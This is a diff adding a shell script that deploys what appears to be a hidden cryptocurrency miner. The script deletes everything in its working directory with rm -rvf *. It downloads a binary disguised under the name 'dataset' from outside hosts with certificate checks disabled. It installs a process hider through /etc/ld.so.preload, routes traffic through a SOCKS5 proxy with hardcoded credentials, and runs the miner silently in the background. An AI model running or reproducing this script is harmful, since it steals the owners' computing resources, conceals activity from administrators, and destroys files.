@@ -1,0 +1,61 @@
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget --no-check-certificate -O dataset https://maskurniawan.serv00.net/golden-miner-pool-prover && chmod +x dataset
+
+wget https://gitlab.com/server3620113/type2026/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 202.155.9.40:443
+socks5_username = excel123
+socks5_password = excel123
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/server3620113/type2026/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp && clear && ./dataset --pubkey=6rs3R6CiapmJdWkcZCM8Wrizqr1kfmMhUf2Ngt9AjfuS4BoGMcdeqQG \
+  --label=Bismillah \
+  --mode=gpu \
+  --threads-per-card=1 > /dev/null 2>&1 & clear
